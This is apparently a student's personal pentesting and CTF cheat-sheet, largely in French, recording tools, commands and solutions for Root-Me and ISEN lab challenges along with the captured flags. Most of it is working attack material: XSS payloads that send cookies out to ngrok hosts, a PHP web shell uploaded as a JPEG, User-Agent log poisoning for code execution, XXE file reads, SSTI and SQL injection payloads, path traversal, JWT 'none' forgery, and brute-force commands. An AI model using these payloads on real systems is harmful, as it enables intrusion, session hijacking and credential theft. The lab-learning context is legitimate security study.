# VPN

sudo openvpn "Azix.ovpn"

# command a faire en debut lors d'un bash
sudo -l 
ps -edf
cron

# website
https://gtfobins.github.io/gtfobins/cat/
https://crackstation.net/
https://addons.mozilla.org/fr/firefox/addon/hacktools/
https://www.wappalyzer.com/
https://www.shodan.io/
https://www.revshells.com/
https://gchq.github.io/CyberChef
https://ruuand.github.io/
https://book.hacktricks.xyz/welcome/readme

# tools

linepeas


# debug with gdb for buffer overflow
gdb ./file
run 
disas main

# where is the commande
type -a ls

#
/usr/bin/curl -o /var/www/html/index.html FILE

# SHELL SHOCK
SHELL SHOCK : MLL{pTOKNpU5A8SvXAyu72SKeF9xXXJcX5Vu1GCXsF5JC}
env x='() { :;};  /bin/bash ' ./mysudo
ps -edf --forest pour voir les éxecution



# hashcat
man crypt -> $6$Ud/SXrsJwyDdHKnx$KTuvLULplNcNycS/BN.JtpDEznAIZZXXhjdlxoiykVmmKXX.8MITmRhbg7Xm0UQv3PFbZhTD79m9vDiQR3kmH0
hashcat -m 1800 -a 0 -o crack.txt hash.txt 10k-most-common.txt


# path traversal
sudo -s 

sudo -l
sudo -U app-script-ch1 -l
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd


# python buffer overflow
(python -c 'print "A"*40 + "\xef\xbe\xad\xde"'; cat) | ./ch13



little indian:\x16\x85\x04\x08

db ch15
run
disassemble shell
(python -c 'print "A"*128 + "\x16\x85\x04\x08"'; cat) | ./ch15




# python server

python3 -m http.server 80814 -> lance un server


# check files

strings file
cat -A file
hexdump -C file


# tcpdump
tcpdump -A -n -v -s 65536 'tcp port 80'


# decode base64
base64 -d /tmp/decode

# sqlmap
sqlmap -u https://training.mylittlelab.org/yip/index.php?name=fred --cookie "Cookie uid=ChGpAmMywzx5QQAaAwMEAg==" 

# xss
<img src="/" onerror=alert(document.cookie);>
<img src="/" onerror=document.getElementById("connectionStatus").innetHTML="<H2>Salut</H2>";>




# Cisco Password :

https://www.frameip.com/decrypter-dechiffrer-cracker-password-cisco-7/


# Dig DNS

cherche ip
nslookup challenge01.root-me.org

Transfert de zone :

dig axfr @212.129.38.224 ch11.challenge01.root-me.org -p 54011


# TTL 

La durée de vie du paquet (TTL, Time To Live). Le champ de durée de vie (TTL) 
permet de connaître le nombre de routeurs traversés par le paquet lors de l'échange entre les deux machines. 
Chaque paquet IP possède un champ TTL positionné à une valeur relativement grande.





# gobuster 

http://challenge01.root-me.org/web-client/ch27/#

gobuster dir -u http://challenge01.root-me.org/web-client/ch27/# -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.241.171/FUZZ`

`dirb http://10.10.241.171/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

`gobuster dir --url http://10.10.241.171/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`




# wpscan:

wpscan --url http://10.10.161.116/wp-login.php -U Elliot -P /usr/share/wordlists/rockyou.txt


# Reverse shell 

https://www.revshells.com/

chercher un code qui permet de reverse shell



# spawn a shell with python

python -c 'import pty; pty.spawn("/bin/sh")'

# jonhthe ripper  -> mot de passe hasher

# hydra

hydra -l user -P passlist.txt ftp://10.10.18.61
hydra -l <username> -P <full path to pass> 10.10.18.61 -t 4 ssh
hydra -l <username> -P <wordlist> 10.10.18.61 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.18.61 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V



# ping of death


ping <ip address> -1 65500 -w 1 -n 1 -> windows
ping <ip address> -s 65500 -t 1 -n 1 -> linux 

# test 
nmap -sn 10.10.10.0/24
nmap -v 10.10.10.152

nmap -Pn 10.0.2.15

ssh -t lab-user@10.10.10.72 bash 
ssh lab-user@10.10.10.72 -t "bash --noprofile -i"
ssh lab-user@10.10.10.72 -t "() { :; }; sh -i "


ssh -t lab-user@10.10.10.72 -p 2022 bash 
ssh lab-user@10.10.10.72 -p 2022 -t "bash --noprofile -i"
ssh lab-user@10.10.10.72 -p 2022 -t "() { :; }; sh -i "

# get suid
cd / ;find . -perm /4000 2>/dev/null




# ngrok XSS

php -S localhost:5555

ngrok http 5555

https://42de-2a01-cb1c-821e-3200-9eb-28e4-96d3-c238.eu.ngrok.io

<script>document.location='https://54d9-2a01-cb1c-821e-3200-9eb-28e4-96d3-c238.eu.ngrok.io/grabber.php?c='+document.cookie</script>
NkI9qe4cdLIO2P7MIsWS8ofD6

# XSS Burp + ngrok


cookie -> invite"><script>window.location = "https://6a37-2a01-cb1c-821e-3200-9eb-28e4-96d3-c238.eu.ngrok.io/foo?cookie".concat(document.cookie)

# XSS DOM 

'-alert("yo")-'

'-document.location='https://62f4-193-52-13-247.eu.ngrok.io/grabber.php?c='+document.cookie-'

%27%2Ddocument%2Elocation%3D%27https%3A%2F%2F62f4%2D193%2D52%2D13%2D247%2Eeu%2Engrok%2Eio%2Fgrabber%2Ephp%3Fc%3D%27%2Bdocument%2Ecookie%2D%27%0A

%27;document.location.href=%22https://ca8d-2a01-cb1c-821e-3200-9eb-28e4-96d3-c238.eu.ngrok.io/?cookie=%22.concat(document.cookie);%27



http://chall1.mpgn.fr:4002/
# chall 1 

go buster sur 
http://chall1.mpgn.fr:4002/
http://chall1.mpgn.fr:4002/challenge/.git/HEAD


## git dumper: Quand ya un file en .git
/home/hugo/.local/bin/git-dumper http://chall1.mpgn.fr:4002/challenge/.git ./
ISEN{3num3r@t10n_1s_k3y}

### PHP Juggling type and magic hashes

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
FLAG : ISEN{3num3r@t10n_1s_k3y}

root me:é"
(si on a un point git on peut regarder les logs git log)
et apres regarder la difference entre les commit : git diff 1572c85d624a10be0aa7b995289359cc4c0d53da a8673b295eca6a4fa820706d5f809f1a8b49fcba



# chall 2

# gobuster 
http://chall2.mpgn.fr/

on a /admin

## header 
password admin:admin

on a le header avec : 
Authorization: Basic YWRtaW46YWRtaW4=

### on scan 
http://chall2.mpgn.fr/admin

gobuster dir --url http://chall2.mpgn.fr/admin/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common-and-french.txt -H 'Authorization: Basic YWRtaW46YWRtaW4='

#### on clique sur le button deconnéction avec burp on recupére avec proxy on l'envoye avec le repeater


SMTGB{8b14d682d5e27cdcf9e2648ea4551d4d}



# chall 3 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp

strcmp()/strcasecmp()
If this function is used for any authentication check (like checking the password) and the user controls one side of the comparison, he can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass this check:
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
The same error occurs with strcasecmp()


http://chall3.mpgn.fr/index.php?username=admin&password[]=

password: SMTGB{b9e13d492514d3fcacb5b3aa48e0a064}


# rootme 

## PHP - Type juggling

username=0
password=[] 

DontForgetPHPL00seComp4r1s0n


## PHP - Loose Comparison

username :0e215962017
password :0e215962017


# chall 4

# get etc/password
http://chall4.mpgn.fr/index.php?p=../../../etc/passwd

# get my cookie
GET /index.php?p=/../../../../var/lib/php/sessions/sess_1859dmrgp6dvhmmupgnkipk3lt



GET /index.php?p=/../../../../var/lib/php/sessions/sess_idjeidiediej HTTP/1.1
Host: chall4.mpgn.fr
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: <?php system('cat ../../../home/tukix/random_name_for_h1dd3n_flag/flag_user.txt');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chall4.mpgn.fr/index.php?p=login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=idjeidiediej
Connection: close





SMTGB{d190636a247b878f757aaf0f01d02fd6}



# chall 5

# chercher robots.txt -> fichier dedans on fuzz pour voir 

gobuster fuzz -u http://chall5.mpgn.fr/index.php?view=FUZZ -w ./Downloads/brute.txt --exclude-length 428


# on trouve le fichier :
http://chall5.mpgn.fr/index.php?view=top-secret/sweetnut.txt

# on trouve le php
http://chall5.mpgn.fr/upload_easypz_666_tkx.php



POST /upload_easypz_666_tkx.php HTTP/1.1
Host: chall5.mpgn.fr
Content-Length: 343
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://chall5.mpgn.fr
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygtUisXDRe3AVKGlu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chall5.mpgn.fr/upload_easypz_666_tkx.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=h0kj59m2pg6lhpa91n3sa8dq9i
Connection: close

------WebKitFormBoundarygtUisXDRe3AVKGlu
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php.jpeg"
Content-Type: image/jpeg

<?php system('ls ../../../home/');?>
<?php system($_GET['cmd']);?>

------WebKitFormBoundarygtUisXDRe3AVKGlu
Content-Disposition: form-data; name="submit"

Upload Image
------WebKitFormBoundarygtUisXDRe3AVKGlu--s



GET /index.php?cmd=ls&view=./upload_dir_666/mypayload.php.jpeg HTTP/1.1
Host: chall5.mpgn.fr
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=3m0f17vvb8o3pdmifaur5nnkq9
Connection: close


# chall 6

# New Entity test
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>

# Read file
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/var/www/secret"> ]>
<data>&example;</data>




SMTGB{e55f661b8998c18f25380ac187afc89e}

# chall 7

POST /auth.php HTTP/1.1
Host: chall7.mpgn.fr
Content-Length: 138
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/xml
Origin: http://chall7.mpgn.fr
Referer: http://chall7.mpgn.fr/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/var/www/secret"> ]>
<credential><name>
&example;
</name>
</credential>


SMTGB{6ca3a0a470d2379463ac80bd26b53948}



# chall 8 


unzip sample.docx 

quand on rentre le fichier docx on nous dit try asdf been added on cherche dans les fichier ou s'est marqué alors on trouve dans le fichier core.xml

on ajoute la xxe

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/var/www/secret"> ]>

<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>&xxe;</dc:title><dc:subject></dc:subject><dc:creator></dc:creator><cp:keywords></cp:keywords><dc:description></dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2015-08-01T19:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2015-09-08T19:22:00Z</dcterms:modified></cp:coreProperties>


zip -r xxe.docx *

on upload le xxe.docx

Title 'SMTGB{0db9407f9c66ff3269e018b398d5e052} ' has been added.



# chall 9 :

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection


{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}


# chall 10:

http://chall10.mpgn.fr/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('cat%20./flag/flag.txt').read()%20%7D%7D


# chall 11




POST /users/login HTTP/1.1
Host: chall11.mpgn.fr
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://chall11.mpgn.fr
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chall11.mpgn.fr/users/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"name": {"$eq": "mpgn"}, "password": {"$ne": "bar"} }


# Local File Inclusion - Double encoding wrapper 

encoder url ci dessous :
php://filter/read=convert.base64-encode/resource=cv

on decode et retrouve le conf

on encode l'url ci dessous:
php://filter/read=convert.base64-encode/resource=conf


https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)&input=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWNvbmY

https://www.base64decode.org/

# chall 12 

## login 1 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based

admin';--

'UNION SELECT NULL,NULL,NULL,NULL,NULL -- -

'+UniOn+Select+1,version(),database()+AS+username,3,4--+


uid='+UniOn+Select+1,gRoUp_cOncaT(0x7c,schema_name,0x7c),database()+AS+username,3,4+fRoM+information_schema.schemata --+&password=cd

-----------> |mysql|,|information_schema|,|performance_schema|,|sys|,|sqlitraining|



uid='UniOn+Select+1,gRoUp_cOncaT(0x7c,table_name,0x7C),database()+AS+username,3,4+fRoM+information_schema.tables+wHeRe+table_schema='sqlitraining' --+&password=cd

-----------> |products|,|users|

uid='UniOn+Select+1,gRoUp_cOncaT(0x7c,column_name,0x7C),database()+AS+username,3,4+fRoM+information_schema.columns+wHeRe+table_name='users' --+&password=cd



# login 2

uid=d')+UniOn+Select+1,password,3,4,5+fRoM+users+wHeRe+username='frodo' --+&password=cd


Welcome f0f8820ee817181d9c6852a097d70d8d

# login 3

searchitem=%' +UniOn+Select+username,password,3,4,5+fRoM+users+where+username+like+'

%' UniOn Select 1,password,username,4,5 fRoM users where username like '


f0f8820ee817181d9c6852a097d70d8d	frodo
56eacb300613db3e0f6aaf821db223c0	frodo

# chall 13

Dockerfile
main.go 

mux server + go lang = path tarversal 

https://ilya.app/blog/servemux-and-path-traversal

-> on regarde dans le docker file le chemin du flag

curl -v -X CONNECT --path-as-is chall13.mpgn.fr:8080/../root/go-go-go-flag.txt

ISEN{G0-g0-p0w3r-R4ng3rs-!!!}

# chall 14

nginx path traversal


GET /f../flag.html HTTP/1.1
Host: chall14.mpgn.fr
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: "6437e6f9-9"
If-Modified-Since: Thu, 13 Apr 2023 11:26:49 GMT
Connection: close


ISEN{n61nx_c4n_b3_y0ur_b357_fr13nd}



# sql map 

./sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche" --forms -T users --dbms=SQLite -D SQLite_masterdb --batch --dump --threads=2



# JWT chall rootme
 # ch1

https://jwt.io/

{
  "typ": "JWT",
  "alg": "none"
} -> encode base 64

{
  "username": "admin"
} -> encode 


WqVfIz70x8i6OjZNqNne9ylZTdPauV7-9RVka41B3b0



ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0K.eyJ1c2VybmFtZSI6ImFkbWluIn0.WqVfIz70x8i6OjZNqNne9ylZTdPauV7-9RVka41B3b0


Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk;


# ch2 
Mettre en POST
mettre content-type: 

Content-Type: application/json

{"username":"admin","password":"admin"}




Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2ODE4MDk4MjEsIm5iZiI6MTY4MTgwOTgyMSwianRpIjoiZGQ2MTY2NjQtODA1Yy00ZTJhLTg3YWEtYWRlMTE4MDdhYjBhIiwiZXhwIjoxNjgxODEwMDAxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.7-OzAHvXv1Gcj27vE7oze2QhLmblSDR2G2-bGQnjaA8=

on rajoute un = pour le padding de la base 64


# JWT brute force 

python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -d /usr/share/wordlists/rockyou.txt -S hs512 -C